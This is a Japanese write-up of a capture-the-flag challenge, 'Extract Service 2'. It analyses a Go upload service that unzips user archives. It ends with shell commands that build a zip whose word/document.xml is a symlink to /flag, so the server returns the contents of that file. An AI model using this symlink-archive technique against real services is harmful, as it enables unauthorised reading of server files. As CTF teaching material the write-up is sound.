# Extract Service 2

Extract Service 1の脆弱な部分にパッチがあたったようです。

```go
		// patched
		extractTarget := ""
		targetParam := c.PostForm("target")
		if targetParam == "" {
			c.HTML(http.StatusOK, "index.html", gin.H{
				"result": "Error : target is required",
			})
			return
		}
		if targetParam == "docx" {
			extractTarget = "word/document.xml"
		} else if targetParam == "xlsx" {
			extractTarget = "xl/sharedStrings.xml"
		} else if targetParam == "pptx" {
			extractTarget = "ppt/slides/slide1.xml"
		} else {
			c.HTML(http.StatusOK, "index.html", gin.H{
				"result": "Error : target is invalid",
			})
			return
		}
```

flagの位置は相変わらず変わっていません。

patchのせいで、targetパラメータに対してのDirectory Traversalが行えなくなりました。

処理の流れを今一度見ていきます。

*main.go*
```go
	r.POST("/", func(c *gin.Context) {
		baseDir := filepath.Join("/tmp", uuid.NewString()) // ex. /tmp/02050a65-8ae8-4b50-87ea-87b3483aab1e
		zipPath := baseDir + ".zip"                        // ex. /tmp/02050a65-8ae8-4b50-87ea-87b3483aab1e.zip

		file, err := c.FormFile("file")
		if err != nil {
			c.HTML(http.StatusOK, "index.html", gin.H{
				"result": "Error : " + err.Error(),
			})
			return
		}

		// patched
		extractTarget := ""
		targetParam := c.PostForm("target")
		if targetParam == "" {
			c.HTML(http.StatusOK, "index.html", gin.H{
				"result": "Error : target is required",
			})
			return
		}
		if targetParam == "docx" {
			extractTarget = "word/document.xml"
		} else if targetParam == "xlsx" {
			extractTarget = "xl/sharedStrings.xml"
		} else if targetParam == "pptx" {
			extractTarget = "ppt/slides/slide1.xml"
		} else {
			c.HTML(http.StatusOK, "index.html", gin.H{
				"result": "Error : target is invalid",
			})
			return
		}

		if err := os.MkdirAll(baseDir, 0777); err != nil {
			c.HTML(http.StatusOK, "index.html", gin.H{
				"result": "Error : " + err.Error(),
			})
			return
		}

		if err := c.SaveUploadedFile(file, zipPath); err != nil {
			c.HTML(http.StatusOK, "index.html", gin.H{
				"result": "Error : " + err.Error(),
			})
			return
		}

		if err := ExtractFile(zipPath, baseDir); err != nil {
			c.HTML(http.StatusOK, "index.html", gin.H{
				"result": "Error : " + err.Error(),
			})
			return
		}

		result, err := ExtractContent(baseDir, extractTarget)
		if err != nil {
			c.HTML(http.StatusOK, "index.html", gin.H{
				"result": "Error : " + err.Error(),
			})
			return
		}

		c.HTML(http.StatusOK, "index.html", gin.H{
			"result": result,
		})
	})

	if err := r.Run(":8080"); err != nil {
		panic(err)
	}
}
```

baseDir (`/tmp/{:uuid}`)を作成します。

fileの中身を、zipPath (`/tmp/{:uuid}.zip`)として、作成します。

次に、Extractfile()を呼びます。これは内部で`unzip zipPath -d baseDir`を行います。

つまり、zipPathの中身をbaseDireに解答します。

次に、ExtractContentです。

baseDir (/tmp/{:uuid}/word/document.xml)を読みに行きます。(targetParam == "docs"の場合)

読んだ結果を返却する感じです。

サーバ内で解答されるzipをアップロードできる場合、シンボリックリンクを使って、リンクされたファイルにアクセスができるらしいです。

今回は/tmp/{:uuid}にアップロードしたファイルが作られるような感覚なので、zipを解凍したらword/document.xmlが作られ、`word/document.xml`が、/flagへのシンボリックリンクとしていれば良さそう。

```bash
# 悪意のあるzipを作成
docker run -it --name instance ubuntu:latest bash
apt update && apt upgrade -y && apt install -y zip
mkdir word
touch /flag
ln -s /flag word/document.xml
zip --symlinks -r test.zip word
docker cp instance:/test.zip .
```

test.zipをアップロードすれば良さそうです。
